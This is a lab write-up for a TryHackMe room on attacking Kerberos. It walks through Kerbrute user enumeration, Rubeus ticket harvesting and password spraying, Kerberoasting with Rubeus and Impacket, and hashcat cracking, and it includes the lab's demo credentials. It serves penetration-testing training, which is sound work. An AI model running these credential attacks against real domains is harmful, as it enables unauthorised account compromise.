# Attacking Kerberos

**Room Link:** [https://tryhackme.com/room/attackingkerberos](https://tryhackme.com/room/attackingkerberos)



## Presteps for Lab

### Kerbrute Installation &#x20;

&#x20;Download a precompiled binary for your OS - [https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O kerbrute && chmod +x kerbrute 
```

### Impacket Installation &#x20;

```
wget https://github.com/fortra/impacket/archive/refs/tags/impacket_0_9_19.tar.gz
tar xvf impacket_0_9_19.tar.gz 
cd /root/impacket-impacket_0_9_19
pip install .
```

### Download wordlists

```
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/User.txt
wget https://raw.githubusercontent.com/Cryilllic/Active-Directory-Wordlists/master/Pass.txt
```



### Add hostname to host file

```
echo $VICTIM CONTROLLER.local  >> /etc/hosts
cat /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## Enumeration w/ Kerbrute

This will brute force user accounts from a domain controller using a supplied wordlist

```
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

## Harvesting & Brute-Forcing Tickets w/ Rubeus

Login with provided credentials

**Kali**

```
ssh Administrator@$VICTIM
Password: P@$$W0rd
```

Harvest tickets with Rubeus

**Victim**

```
cd Downloads
Rubeus.exe harvest /interval:30
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

**Victim**

```
echo $VICTIM CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
cd Downloads
Rubeus.exe brute /password:Password1 /noticket
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

## Kerberoasting w/ Rubeus & Impacket

### Kerberoasting #1 - Rubeus&#x20;

This will dump the Kerberos hash of any kerberoastable users.

**Victim**

```
cd Downloads
Rubeus.exe kerberoast
```

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Copy the hashes from the command prompt onto the attacker machine and put it into a .txt file so we can crack it with hashcat. Below command removes all the tabs and formats it properly for hashcat. If you don't format it properly than hashcat will error out.

**Kali**

```
cat hashes.txt | sed 's/[[:space:]]//g' |tr -d '\n' | sed 's/$krb5tgs$23$*/\n&/g'  > hash.txt
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

Hashcat found the passwords for both of the hashes.

```
hashcat -m 13100 -a 0 hash.txt Pass.txt --show
```

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### Kerberoasting #2  - Impacket

```
sudo python3.9 /root/test/impacket/examples/GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.226.108 -request > hashes.txt
```

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Hashes were found for the same two accounts when doing this with Rubeus.

```
hashcat -m 13100 -a 0 hashes.txt Pass.txt
hashcat -m 13100 -a 0 hashes.txt Pass.txt --show
```

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

## AS-REP Roasting w/ Rubeus
